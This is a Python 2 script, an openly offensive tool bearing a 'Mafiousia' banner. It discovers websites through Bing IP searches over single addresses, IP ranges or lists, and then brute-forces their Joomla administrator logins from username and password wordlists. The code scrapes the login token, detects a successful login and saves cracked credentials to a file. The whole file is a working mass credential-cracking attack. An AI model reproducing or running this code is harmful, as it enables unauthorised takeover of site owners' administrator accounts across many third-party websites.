# -*- coding: utf-8 -*-
import re , urllib2  , sys , os, requests
from platform import system
from time import sleep
from threading import Thread
from colorama import init												
init(autoreset=True)
if system() == 'Linux':
    os.system('clear')
if system() == 'Windows':
    os.system('cls')
print '\n'
print '\t ▄▄▄██▀▀▒█████  ▒█████  ███▄ ▄███▓██▓   ▄▄▄        '
print '\t   ▒██ ▒██▒  ██▒██▒  ██▓██▒▀█▀ ██▓██▒  ▒████▄      '
print '\t   ░██ ▒██░  ██▒██░  ██▓██    ▓██▒██░  ▒██  ▀█▄    '
print '\t▓██▄██▓▒██   ██▒██   ██▒██    ▒██▒██░  ░██▄▄▄▄██   '
print '\t ▓███▒ ░ ████▓▒░ ████▓▒▒██▒   ░██░██████▓█   ▓██▒  '
print '\t ▒▓▒▒░ ░ ▒░▒░▒░░ ▒░▒░▒░░ ▒░   ░  ░ ▒░▓  ▒▒   ▓▒█░  '
print '\t ▒ ░▒░   ░ ▒ ▒░  ░ ▒ ▒░░  ░      ░ ░ ▒  ░▒   ▒▒ ░  '
print '\t ░ ░ ░ ░ ░ ░ ▒ ░ ░ ░ ▒ ░      ░    ░ ░   ░   ▒     '
print '\t ░   ░     ░ ░     ░ ░        ░      ░  ░    ░  ░  '
                                                 
site = []
listpass = 'Bruteforce/pass.txt'
listuser = 'Bruteforce/user.txt'
banner = '''
|| Mafiousia 
'''
class Jmbrute(object) :
  """
  Class to brute force joomla
  """
  def __init__(self, website, timeout=10) :
    self.website = website
    # Making a requests sesion object
    self.req = requests.session()
    self.timeout = timeout

  def __makeGet(self, url) :
    try :
      return self.req.get(url, timeout=self.timeout).text
    except :
      pass

  def getToken(self) :
    try :
      return re.search('<input type="hidden" name="(.*?)" value="1" />', self.__makeGet(self.website)).group(1)
    except :
      return False

  def trylogin(self, user, passwd, token) :
    dat = {
        'username' : user,
        'passwd'   : passwd,
        token      : '1',
        'lang'     : '',
        'option'   : 'com_login',
        'task'     : 'login',
        'return'   : 'aW5kZXgucGhw'
        }
    try :
      self.req.post(self.website, data=dat, timeout=self.timeout)
    except :
      pass
  def checklog(self) :
    res = self.__makeGet(self.website)
    if res : return 'logout' in res
    else : return False
def file2list(fil) :
  with open(fil, 'r')  as myfile :
    return myfile.read().split()
def brute(url,user,passw):
    site = url + "/administrator/index.php"
    for us in user:
        for passwd in passw:
            jm = Jmbrute(site)
            token = jm.getToken()
            if token:
                jm.trylogin(us, passwd, token)
                if jm.checklog():
                    print  '[*] Cracked', site, '\n#Username : ' + us, '\n#Password :', passwd + '\n'
                    logger(site, us, passwd, 'Result/Cracked.txt')
                    break
def logger(website, user, passwd, filename) :
  with open(filename, 'a') as myfile :
    myfile.write('[*] Cracked '+website+' \n#Username : '+user+' \n#Password : '+passwd+'\n')
def prepare(url, ua):
	try:
		global user_agent
		headers = {
			'User-Agent' : user_agent,
			'x-forwarded-for' : ua
		}
		cookies = urllib2.Request(url, headers=headers)
		result = urllib2.urlopen(cookies)
		cookieJar = result.info().getheader('Set-Cookie')
		injection = urllib2.Request(url, headers=headers)
		injection.add_header('Cookie', cookieJar)
		urllib2.urlopen(injection)
	except:
		pass

def test(url):
    try:
        openbing = urllib2.urlopen(url)
        readbing = openbing.read()
        req = requests.get(url)
        if re.findall("Joomla", readbing) or "Joomla" in req.text or urllib2.urlopen(url+"/administrator").getcode() == 200:
            print "[!]-> Scanning : " + url
            print "\n --> Brute Forcing Started For "
            userlist = file2list(listuser)
            passlist = file2list(listpass)
            brute(url,userlist,passlist)
        else:
            pass
    except:
        pass
def grabber(s):
    global site
    xxxx = []
    page = 1
    while page <= 101:
        bing = "http://www.bing.com/search?q=ip%3A" + s + "+&count=20&first=" + str(page)
        openbing = urllib2.urlopen(bing)
        readbing = openbing.read()
        findwebs = re.findall('<h2><a href="(.*?)"', readbing)
        for i in range(len(findwebs)):
            allnoclean = findwebs[i]
            findall1 = re.findall('http://(.*?)/', allnoclean)
            for idx, item in enumerate(findall1):
                if 'www' not in item:
                    findall1[idx] = 'http://www.' + item + '/'
                else:
                    findall1[idx] = 'http://' + item + '/'
            xxxx.extend(findall1)
        page = page + 10
    final = unique(xxxx)
    site.extend(final)

def ipRange(start_ip, end_ip):
    start = list(map(int, start_ip.split(".")))
    end = list(map(int, end_ip.split(".")))
    temp = start
    ip_range = []

    ip_range.append(start_ip)
    while temp != end:
        start[3] += 1
        for i in (3, 2, 1):
            if temp[i] == 256:
                temp[i] = 0
                temp[i - 1] += 1
        ip_range.append(".".join(map(str, temp)))

    return ip_range
def main():
    print "\n[!] Option :"
    print "\r\n[1] From Server IP\n[2] From File List\n[3] IP Range\n"
    c = raw_input("Choose Number :")
    if c == '1':
        ip = raw_input('[+] Enter Server IP : ')
        try:
            print banner
            grabber(str(ip))
            for _site in site:
                test(_site)
        except:
            pass
    elif c == '2':
            list = raw_input('[+] Enter List Name : ')
            try:
                file = open(list).readlines()
                print banner
                if (len(file) > 0):
                    for attack in file:
                        _attack = attack.rstrip()
                        test(_attack)
            except:
                pass
            else:
                pass
    elif c == '3':
        ip_start = raw_input('[+] Enter Start IP : ')
        ip_end = raw_input('[+] Enter End IP : ')
        try:
            print banner
            ip_range = ipRange(ip_start, ip_end)
            for ip in ip_range:
                grabber(ip)
                for _site in site:
                    test(_site)
        except:
            pass
if __name__ == '__main__':
    main()
